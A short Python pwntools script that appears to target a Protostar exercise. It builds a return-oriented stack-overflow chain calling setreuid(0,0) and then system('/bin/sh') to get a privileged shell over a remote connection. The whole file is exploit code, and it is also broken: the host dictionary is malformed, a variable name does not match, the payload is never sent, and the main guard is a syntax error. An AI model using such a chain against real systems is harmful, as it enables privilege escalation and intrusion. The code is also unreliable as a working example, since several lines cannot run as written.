from pwn import *

protostar={'host':"",'port:22'} #input protostar address and port 22 or 23

context(os='linux',arch='i386')

setreuid_addr=0xb7f5b700
system_addr=0xb7ecffb0
binsh_addr=0xb7fb63bf
exit_addr=0xb7ec60c0

ret=0x08048383
pret=0x080485f8
ppret=0x080485f7

def attack(conn):
    attack_bof=p32('a'*80)
    attack+=p32(ret)
    
    attack+=p32(setreuid_addr)
    attack+=p32(ppret)
    attack+=p32(0)
    attack+=p32(0)

    attack+=p32(system_addr)
    attack+=p32(pret)
    attack+=p32(binsh_addr)
    attack+=p32(exit_addr)


if __name__='__main__':
    conn=remote(protostar['host'],protostar['port'])
    attack(conn)
    conn.interactive()
